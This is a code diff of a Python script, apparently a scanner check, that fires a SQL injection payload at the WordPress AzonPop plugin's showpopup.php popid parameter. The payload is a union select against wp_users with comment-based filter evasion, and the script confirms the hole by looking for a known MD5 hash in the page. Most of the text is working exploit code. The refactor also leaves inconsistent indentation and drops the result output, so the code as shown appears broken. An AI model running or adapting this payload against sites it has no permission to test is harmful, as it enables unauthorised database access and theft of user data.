@@ -9,20 +9,13 @@ description: payload:/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=
 import sys
 import requests
 import warnings
-
-
-
-class plugin_azonpop_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['Wordpress AzonPop插件SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
             }
         payload = "/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(Md5(1234))),0x3c2f62723e,unhex(hex(Md5(1234))))*/,4,5%20/*!00000from*/%20wp_users"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
@@ -37,5 +30,5 @@ class plugin_azonpop_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = plugin_azonpop_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
